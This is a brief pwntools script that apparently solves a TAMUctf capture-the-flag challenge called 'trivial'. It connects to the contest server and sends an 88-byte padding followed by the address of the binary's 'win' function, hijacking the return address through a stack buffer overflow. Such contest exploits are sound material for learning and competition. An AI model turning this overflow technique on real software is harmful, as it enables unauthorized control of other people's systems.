from pwn import *


e = ELF('./trivial')
#p = e.debug()
p = remote("tamuctf.com", 443, ssl=True, sni="trivial")

attack = b'A' * 88 + p64(e.symbols['win'])

p.sendline(attack)
p.interactive()
